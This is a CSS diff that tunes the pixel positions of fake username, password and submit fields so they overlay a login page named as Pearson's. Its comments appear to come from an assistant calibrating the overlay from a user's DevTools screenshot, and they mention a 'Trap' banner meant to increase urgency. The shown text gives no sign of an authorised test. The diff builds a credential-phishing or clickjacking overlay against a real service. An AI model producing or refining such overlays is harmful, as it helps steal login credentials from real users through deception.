@@ -21,19 +21,20 @@
       position: fixed;
       left: 50%;
       transform: translateX(-50%);
-      width: 442px; /* Matches Pearson's UI width */
-      height: 48px;
-      opacity: 0.05; /* Set to 0.5 and red background for tuning */
+      /* Calibrated from your DevTools screenshot */
+      width: 548px;  /* Exactly matches the blue highlight */
+      height: 42px;  /* Exactly matches the blue highlight */
+      opacity: 0.5;  /* Set to 0.5 RED to verify alignment first */
+      background: red;
       z-index: 100;
-      border: 2px solid red; /* Visual aid for tuning */
-      background: red !important;
+      border: none;
       outline: none;
     }
 
-    /* Pixel-calibrated positions based on the SPA centered layout */
-    #fake-username { top: 434px; }
-    #fake-password { top: 524px; }
-    #fake-submit   { top: 625px; height: 50px; cursor: pointer; }
+    /* Calibrated Y-coordinates (Adjust these if they don't sit perfectly on top) */
+    #fake-username { top: 345px; } 
+    #fake-password { top: 500px; } 
+    #fake-submit   { top: 635px; width: 548px; height: 45px; cursor: pointer; }
 
     /* The "Trap" Banner - increases urgency and explains the overlay */
     #banner {
